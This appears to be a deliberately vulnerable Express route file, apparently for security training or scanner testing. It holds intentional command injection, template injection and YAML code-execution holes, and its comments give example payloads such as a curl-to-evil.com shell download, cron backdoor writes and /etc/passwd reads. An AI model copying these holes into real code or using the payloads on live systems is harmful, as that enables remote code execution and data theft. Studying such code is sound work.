/**
 * Code Execution & Template Vulnerabilities (JavaScript/Express)
 * Contains: Command Injection (Argument Injection), Blind Command Injection (Worker),
 *           Blind SSTI, YAML Deserialization
 */
const express = require('express');
const { execFile, exec, spawn } = require('child_process');
const yaml = require('js-yaml');
const ejs = require('ejs');
const nunjucks = require('nunjucks');
const Bull = require('bull');
const router = express.Router();

// Background job queue
const jobQueue = new Bull('background-jobs', 'redis://127.0.0.1:6379');


// ============================================================================
// VULN 17: Command Injection via Argument Injection (NOT String Concatenation)
// The developer uses execFile with an argument array (normally safe),
// but the attacker controls an argument that the underlying tool
// interprets as a dangerous flag.
// ============================================================================
router.post('/api/convert/image', (req, res) => {
    const { input, format } = req.body;
    const outputPath = `/tmp/output.${format || 'png'}`;

    // The developer thinks execFile with an array is safe (no shell injection).
    // But ImageMagick's convert interprets certain filenames as commands:
    //   input = "ephemeral:|id > /tmp/pwned" (delegate execution)
    //   input = "-write /etc/cron.d/backdoor" (argument injection)
    //   input = "msl:/tmp/payload.msl" (MSL command file)
    execFile('convert', [input, outputPath], { timeout: 30000 }, (err, stdout, stderr) => {
        if (err) return res.status(500).json({ error: stderr });
        res.json({ status: 'converted', output: outputPath });
    });
});

router.post('/api/git/log', (req, res) => {
    const { branch } = req.body;

    // VULNERABLE: Argument injection via git.
    // Attacker sends branch = "--exec=id" or branch = "--upload-pack=evil"
    // Even without shell=true, git interprets these as valid flags.
    execFile('git', ['log', '--oneline', '-n', '10', branch || 'main'],
        { timeout: 10000 },
        (err, stdout) => {
            if (err) return res.status(500).json({ error: err.message });
            res.json({ log: stdout });
        }
    );
});


// ============================================================================
// VULN 18: Blind Command Injection via Background Worker (Bull Queue)
// User input is placed into a Redis-backed job queue. A background worker
// processes jobs asynchronously, executing the payload minutes later.
// No immediate response indicates injection worked.
// ============================================================================
jobQueue.process(async (job) => {
    const { type, data } = job.data;

    if (type === 'email') {
        const recipient = data.to || '';
        const subject = data.subject || '';
        // VULNERABLE: recipient is interpolated into a shell command.
        // Attacker sends to = "a@b.com; curl http://evil.com/shell.sh | bash"
        exec(`echo '${subject}' | mail -s 'Notification' ${recipient}`);
    }

    if (type === 'report') {
        const reportName = data.name || 'report';
        // VULNERABLE: reportName is interpolated into a shell command.
        exec(`wkhtmltopdf http://localhost/reports/${reportName} /tmp/${reportName}.pdf`);
    }
});

router.post('/api/jobs/email', async (req, res) => {
    // The injection payload sits in Redis until the worker processes it.
    await jobQueue.add({
        type: 'email',
        data: { to: req.body.to, subject: req.body.subject }
    });
    res.json({ status: 'queued' });
});

router.post('/api/jobs/report', async (req, res) => {
    await jobQueue.add({
        type: 'report',
        data: { name: req.body.report_name }
    });
    res.json({ status: 'queued' });
});


// ============================================================================
// VULN 19: Blind SSTI (Server-Side Template Injection)
// User input is directly compiled as template code instead of being passed
// as a template variable. The attacker can execute arbitrary server-side code.
// ============================================================================
router.post('/api/render/greeting', (req, res) => {
    const { name } = req.body;

    // VULNERABLE: The user's name is treated as EJS TEMPLATE CODE, not data.
    // If attacker sends name = "<%= process.env %>" they get all env variables.
    // If they send name = "<%= require('child_process').execSync('id').toString() %>"
    // they achieve Remote Code Execution.
    const templateString = `Hello ${name}! Welcome to our platform.`;
    try {
        const result = ejs.render(templateString);
        res.json({ greeting: result });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

router.post('/api/render/page', (req, res) => {
    const { title, content } = req.body;

    // VULNERABLE: Entire page content is user-controlled Nunjucks template code.
    // Attacker sends content containing Nunjucks template expressions.
    const pageTemplate = `
    <html>
    <head><title>${title}</title></head>
    <body>${content}</body>
    </html>
    `;
    try {
        const rendered = nunjucks.renderString(pageTemplate);
        res.json({ html: rendered });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});


// ============================================================================
// VULN 20: Insecure Deserialization via YAML
// Uses js-yaml's DEFAULT_SCHEMA or FULL_SCHEMA which allows instantiation
// of JavaScript-specific types and can lead to code execution.
// Also demonstrates a custom type that executes code during deserialization.
// ============================================================================
// Custom YAML type that executes shell commands during parsing
const execType = new yaml.Type('!exec', {
    kind: 'scalar',
    construct: function(data) {
        // VULNERABLE: This custom type runs shell commands when YAML is parsed.
        // Attacker sends: !exec "cat /etc/passwd"
        const { execSync } = require('child_process');
        return execSync(data).toString();
    }
});

const DANGEROUS_SCHEMA = yaml.DEFAULT_SCHEMA.extend([execType]);

router.post('/api/import/config', (req, res) => {
    const yamlData = req.body.yaml || '';

    try {
        // VULNERABLE: Using a schema that includes the !exec custom type.
        // Attacker sends YAML containing: !exec "id"
        // The custom type constructor executes the command during parsing.
        const config = yaml.load(yamlData, { schema: DANGEROUS_SCHEMA });
        res.json({ config });
    } catch (e) {
        res.status(400).json({ error: e.message });
    }
});

router.post('/api/import/template', (req, res) => {
    const yamlData = req.body.yaml || '';

    // VULNERABLE: Uses DEFAULT_FULL_SCHEMA which processes JavaScript-specific
    // YAML types. Combined with the custom schema, this is catastrophic.
    try {
        const templateData = yaml.load(yamlData, { schema: DANGEROUS_SCHEMA });
        res.json({ template: JSON.stringify(templateData) });
    } catch (e) {
        res.status(400).json({ error: e.message });
    }
});

module.exports = router;
